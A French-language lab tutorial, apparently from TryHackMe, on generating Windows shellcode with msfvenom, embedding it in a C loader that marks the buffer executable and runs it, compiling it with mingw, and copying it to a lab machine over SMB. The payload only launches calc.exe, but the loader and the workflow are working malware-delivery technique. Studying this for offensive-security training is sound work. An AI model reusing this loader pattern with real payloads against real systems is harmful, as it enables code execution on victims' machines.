# Génération et Exécution de Shellcode avec des Outils Publics

Dans cette tâche, nous allons voir comment générer et exécuter du shellcode à l'aide d'outils publics comme le framework Metasploit.

---

## Générer du Shellcode avec des Outils Publics

Le shellcode peut être généré dans un format spécifique selon le langage de programmation utilisé. Par exemple, si votre dropper (le fichier `.exe` principal) est écrit en C, il faudra générer un shellcode compatible avec ce langage.

L'avantage d'utiliser des outils publics est qu'il n'est pas nécessaire de créer un shellcode personnalisé ou d'être expert en assembleur. La plupart des frameworks C2 proposent leur propre générateur de shellcode. Cependant, ces shellcodes sont souvent connus des éditeurs d'antivirus et donc facilement détectables.

---

## Générer un Shellcode pour Exécuter `calc.exe`

Utilisons `msfvenom` sur l'AttackBox pour générer un shellcode qui lance la calculatrice Windows (`calc.exe`):

```bash
user@AttackBox$ msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f c
No encoder specified, outputting raw payload
Payload size: 193 bytes
Final size of c file: 835 bytes
```

```c
unsigned char buf[] =
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
"\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
```

Ce shellcode exécute la calculatrice Windows. C'est un exemple classique pour valider le fonctionnement d'une technique d'injection.

---

## Injection de Shellcode

Les attaquants injectent du shellcode dans un processus ou un thread en cours d'exécution via différentes techniques, modifiant ainsi le flux d'exécution du programme pour exécuter leur propre code.

Voici un exemple de code C utilisant le shellcode généré, qui sera injecté en mémoire et exécutera `calc.exe` :

```c
#include <windows.h>
char stager[] = {
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
"\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00" };
int main()
{
    DWORD oldProtect;
    VirtualProtect(stager, sizeof(stager), PAGE_EXECUTE_READ, &oldProtect);
    int (*shellcode)() = (int(*)())(void*)stager;
    shellcode();
}
```

---

## Compilation et Transfert

Pour compiler le programme sous Windows :

```bash
user@AttackBox$ i686-w64-mingw32-gcc calc.c -o calc-MSF.exe
```

Pour transférer le fichier sur la machine Windows via SMB :

```bash
user@AttackBox$ smbclient -U thm '//MACHINE_IP/Tools'
smb: \> put calc-MSF.exe
```

Le fichier sera copié dans `C:\Tools\` sur la machine Windows.

---

## Exécution et Tests

Vous pouvez tester votre payload sur la machine cible ou via le service Antivirus Check de THM à l'adresse `http://MACHINE_IP/`.

---

## Générer du Shellcode à partir de Fichiers EXE

Le shellcode peut aussi être stocké dans des fichiers `.bin` (format brut). Pour obtenir la représentation hexadécimale d'un fichier binaire, utilisez la commande `xxd -i` :

```bash
user@AttackBox$ msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f raw > /tmp/example.bin
user@AttackBox$ file /tmp/example.bin
/tmp/example.bin: data
user@AttackBox$ xxd -i /tmp/example.bin
```

Exemple de sortie :

```c
unsigned char _tmp_example_bin[] = {
  0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64,
  // ...
  0x00
};
unsigned int _tmp_example_bin_len = 193;
```

La sortie correspond au shellcode généré précédemment avec Metasploit.

---

N'hésitez pas à expérimenter avec différents types de shellcodes et formats proposés par Metasploit pour approfondir vos connaissances.
